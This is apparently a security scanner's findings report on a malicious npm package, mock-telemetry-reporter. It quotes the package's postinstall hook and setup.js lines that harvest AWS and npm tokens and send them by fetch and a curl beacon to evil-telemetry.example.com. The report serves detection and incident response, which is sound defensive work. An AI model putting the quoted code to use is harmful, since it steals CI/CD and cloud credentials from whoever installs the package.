findings.benignExplanation: Some organizations publish 'mock-*' packages that are genuinely used at runtime for demo, simulation, or canary-testing purposes. The naming choice may be coincidental or reflect an unconventional but legitimate use case.
findings.suggestedAction: Quarantine pending human review. Verify with the committer whether this package is intentionally a production dependency and confirm the publisher identity matches the expected organization.

findings.observation: Package mock-telemetry-reporter@1.0.0 defines a postinstall lifecycle script: "node setup.js". This script executes automatically upon package installation without user intervention.
findings.interpretation: The presence of a postinstall script in a newly added, single-maintainer package with no attestation is a behavioral trigger. The script invokes setup.js, which scanner observations confirm performs credential harvesting and network exfiltration. This lifecycle hook ensures malicious code runs unconditionally on install.
findings.suggestedAction: Block installation. Postinstall scripts that trigger network and credential-harvesting behavior must not be permitted in a production dependency.

findings.observation: setup.js line 3 reads environment variables AWS_SECRET_ACCESS_KEY and NPM_TOKEN: "const token = process.env.AWS_SECRET_ACCESS_KEY || process.env.NPM_TOKEN;"
findings.interpretation: The script specifically targets well-known secrets-bearing environment variables (AWS credentials and npm publish tokens). This is a credential-harvesting pattern characteristic of supply chain malware designed to exfiltrate CI/CD secrets and cloud access keys.
findings.suggestedAction: Block installation. Targeted credential harvesting of AWS_SECRET_ACCESS_KEY and NPM_TOKEN has no legitimate use in a telemetry reporter package.

findings.observation: setup.js line 4 performs an HTTP fetch to an external attacker-controlled domain encoding the harvested token: "fetch(\"https://evil-telemetry.example.com/exfil?token=\" + encodeURIComponent(token || 'none'));"
findings.interpretation: The network call transmits the harvested credential value to a URL whose domain name (evil-telemetry.example.com) is explicitly adversarial. This confirms the environment access observation is part of a credential exfiltration chain. The token is appended as a query parameter, a classic data-exfiltration pattern.
findings.suggestedAction: Block immediately. This is unambiguous credential exfiltration to an external attacker-controlled endpoint.

findings.observation: setup.js lines 5–6 import child_process and invoke execSync to run a curl beacon to the same attacker domain: "execSync(\"curl -s https://evil-telemetry.example.com/beacon\");"
findings.interpretation: Process execution via child_process.execSync is a high-risk behavioral indicator. Combined with the curl call to the same attacker-controlled domain as the fetch exfiltration, this constitutes a second, independent exfiltration/beaconing channel. The redundancy suggests intentional resilience: if the fetch API is unavailable, execSync/curl is the fallback. This is a textbook multi-vector exfiltration script.
findings.suggestedAction: Block immediately. Dual-channel exfiltration using both fetch and execSync/curl to an attacker-controlled domain represents critical malicious behavior.

findings.interpretation: The co-occurrence of install script + environment access + network operations + process execution across all six scanner observations for this package constitutes a definitive data-exfiltration pattern. All four signal categories required for critical severity upgrade are present. This package is a supply chain implant designed to steal CI/CD credentials and cloud access keys upon installation.
findings.suggestedAction: BLOCK. Do not install. Remove from package.json and lockfile immediately. Rotate any secrets that may have been exposed in environments where this package was previously installed. Investigate whether any CI/CD pipeline has already executed this postinstall script.
